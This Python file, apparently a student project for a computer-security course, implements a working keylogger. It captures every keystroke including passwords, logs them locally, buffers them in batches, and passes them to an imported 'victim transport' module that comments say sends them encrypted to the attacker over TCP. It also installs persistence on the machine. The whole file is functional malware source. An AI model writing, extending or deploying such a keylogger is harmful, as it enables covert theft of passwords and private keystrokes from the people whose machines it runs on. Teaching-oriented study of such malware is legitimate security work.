"""
keylogger.py — Módulo de captura de teclado
Proyecto Unidad 2 - Seguridad Informática

Flujo: captura → buffer → [cifrado] → [envío] → [descifrado] → [visualización]

Dependencias: pynput, cryptography
    pip install pynput cryptography
"""

import logging
import queue
import threading
import time
import pynput
from datetime import datetime, timezone
from pynput.keyboard import Key, Listener

from persistencia import instalar_persistencia, verificar_persistencia
from transporte_victima import send_batch

# ══════════════════════════════════════════════════════════════════════════════
# CONFIGURACIÓN GLOBAL
# ════════════════════════════════════════════════════════════════════════════════

LOG_FILE       = "keylog.txt"   # Log local de respaldo
BUFFER_MAX     = 50             # Teclas acumuladas antes de flush por tamaño
FLUSH_INTERVAL = 5.0            # Segundos entre flushes periódicos

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.DEBUG,
    format="%(asctime)s: %(message)s"
)

# ══════════════════════════════════════════════════════════════════════════════
# MÓDULO DE BUFFER
# ══════════════════════════════════════════════════════════════════════════════

class KeyBuffer:
    """
    Buffer thread-safe entre el keylogger y el módulo de cifrado/envío.

    Estrategias de flush:
      - Por tamaño : cuando acumula >= BUFFER_MAX teclas.
      - Por tiempo : cada FLUSH_INTERVAL segundos (hilo daemon).

    Parámetros:
        max_size  (int)      : Teclas máximas antes de flush automático.
        interval  (float)    : Segundos entre flushes periódicos.
        on_flush  (callable) : Función que recibe list[(timestamp, tecla)].
    """

    def __init__(self, max_size: int, interval: float, on_flush):
        self._queue    = queue.Queue()   # Cola thread-safe de Python stdlib
        self._max_size = max_size
        self._on_flush = on_flush
        self._running  = True
        self._count    = 0               # Contador rápido sin lock adicional

        # Hilo daemon: muere automáticamente cuando el proceso principal termina
        self._timer = threading.Thread(
            target=self._periodic_flush,
            args=(interval,),
            daemon=True,
            name="BufferFlushThread"
        )
        self._timer.start()

    # ── API pública ────────────────────────────────────────────────────────────

    def add(self, key_str: str) -> None:
        """
        Agrega una tecla al buffer.
        Si se alcanza BUFFER_MAX, dispara un flush inmediato en un hilo separado
        para no bloquear el hilo de captura.

        Parámetros:
            key_str (str): Representación string de la tecla presionada.
        """
        entry = (datetime.now(timezone.utc).isoformat(), key_str)
        self._queue.put(entry)
        self._count += 1

        if self._count >= self._max_size:
            self._count = 0
            threading.Thread(target=self._flush, daemon=True).start()

    def stop(self) -> None:
        """
        Detiene el hilo periódico y vacía el buffer antes de cerrar.
        Llamar siempre al terminar el programa para no perder teclas.
        """
        self._running = False
        self._flush()   # Flush final de lo que quede

    # ── Internos ───────────────────────────────────────────────────────────────

    def _flush(self) -> None:
        """
        Extrae todos los elementos de la cola y los pasa al callback on_flush.
        queue.Queue.get_nowait() es thread-safe sin necesidad de lock explícito.
        """
        batch = []
        try:
            while True:
                batch.append(self._queue.get_nowait())
        except queue.Empty:
            pass

        if batch:
            self._on_flush(batch)

    def _periodic_flush(self, interval: float) -> None:
        """
        Hilo daemon que ejecuta _flush cada `interval` segundos.

        Parámetros:
            interval (float): Segundos entre cada flush periódico.
        """
        while self._running:
            time.sleep(interval)
            self._flush()


# ══════════════════════════════════════════════════════════════════════════════
# CALLBACK DE FLUSH → ENTRADA AL MÓDULO DE CIFRADO
# ══════════════════════════════════════════════════════════════════════════════

def on_flush(batch: list) -> None:
    """
    Recibe un lote de teclas desde el buffer y lo pasa al módulo de cifrado.

    Este es el punto de integración con el Ejercicio 2: aquí se serializa
    el batch, se cifra con AES-256-GCM y se envía al atacante por TCP.

    Parámetros:
        batch (list): Lista de tuplas (timestamp_ISO_str, tecla_str).

    Flujo esperado (a implementar):
        batch → serialize(batch) → encrypt(data) → send_tcp(ciphertext)
    """
    print(f"[FLUSH] {len(batch)} teclas capturadas")
    for ts, key in batch:
        print(f"  {ts}  {key}")
    send_batch(batch)

    # ── Siguiente etapa (Ejercicio 2) ──────────────────────────────────────
    # import json
    # from cifrado import encrypt       # módulo AES-256-GCM
    # from transporte import send_tcp   # módulo socket TCP
    #
    # payload   = json.dumps(batch).encode()
    # encrypted = encrypt(payload)
    # send_tcp(encrypted)
    # ──────────────────────────────────────────────────────────────────────


# ══════════════════════════════════════════════════════════════════════════════
# NORMALIZACIÓN DE TECLAS
# ══════════════════════════════════════════════════════════════════════════════

def normalize_key(key) -> str:
    """
    Convierte el objeto Key/KeyCode de pynput a un string legible.

    Distingue entre:
      - Teclas especiales (Key.space, Key.enter, etc.) → etiqueta entre < >
      - Caracteres imprimibles                         → carácter directo
      - KeyCode sin char (teclas del sistema)          → representación hex

    Parámetros:
        key: Objeto pynput Key o KeyCode.

    Retorna:
        str: Representación normalizada de la tecla.

    Limitaciones conocidas:
        - Campos de contraseña en navegadores: el SO enmascara el texto a
          nivel de API de accesibilidad; pynput recibe las teclas igual,
          pero no puede distinguir si se escribe en un campo <input type=password>.
        - Teclas multimedia (volumen, play): dependen del SO y driver.
        - Combinaciones AltGr en teclados no-QWERTY pueden no resolverse.
    """
    if isinstance(key, Key):
        # Tecla especial: Key.space → "<space>", Key.enter → "<enter>"
        return f"<{key.name}>"

    # Tecla normal: intentar obtener el carácter imprimible
    try:
        return key.char if key.char is not None else f"<keycode:{key.vk}>"
    except AttributeError:
        return str(key)


# ══════════════════════════════════════════════════════════════════════════════
# CALLBACKS DEL LISTENER
# ══════════════════════════════════════════════════════════════════════════════

# Instancia global del buffer (inicializada en main)
_buffer: KeyBuffer = None


def on_press(key) -> None:
    """
    Callback invocado por pynput en cada pulsación de tecla.
    Registra en log local y agrega al buffer para cifrado/envío.

    Parámetros:
        key: Objeto pynput Key o KeyCode de la tecla presionada.
    """
    key_str = normalize_key(key)
    logging.info(key_str)       # Respaldo local en keylog.txt
    _buffer.add(key_str)        # → Buffer → cifrado → envío


def on_release(key) -> bool | None:
    """
    Callback invocado al soltar una tecla.
    Permite detener el listener con ESC (útil en entorno controlado).

    Parámetros:
        key: Objeto pynput Key o KeyCode de la tecla liberada.

    Retorna:
        False para detener el Listener, None para continuar.
    """
    if key == Key.esc:
        return False    # Detiene el Listener limpiamente


# ══════════════════════════════════════════════════════════════════════════════
# ENTRADA PRINCIPAL
# ══════════════════════════════════════════════════════════════════════════════

def main() -> None:
    """
    Inicializa el buffer y arranca el Listener de teclado.

    Flujo de ejecución:
        1. Crea instancia de KeyBuffer con callback on_flush.
        2. Inicia Listener bloqueante de pynput.
        3. Al detectar ESC o KeyboardInterrupt, detiene el buffer
           (flush final) y cierra limpiamente.
    """
    
    # ── Persistencia ───────────────────────────────────────────────────────
    # Instalar solo si no existe aún — evita duplicar la entrada
    if not verificar_persistencia():
        instalar_persistencia()
    else:
        print("[*] Persistencia ya instalada.")
    

    # ── Keylogger ───────────────────────────────────────────────────────
    global _buffer
    _buffer = KeyBuffer(
        max_size=BUFFER_MAX,
        interval=FLUSH_INTERVAL,
        on_flush=on_flush
    )

    print("[*] Keylogger iniciado. Presiona ESC para detener.")

    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except KeyboardInterrupt:
        print("\n[*] Interrupción por teclado.")
    finally:
        print("[*] Deteniendo buffer...")
        _buffer.stop()
        print("[*] Buffer vaciado. Programa terminado.")


if __name__ == "__main__":
    main()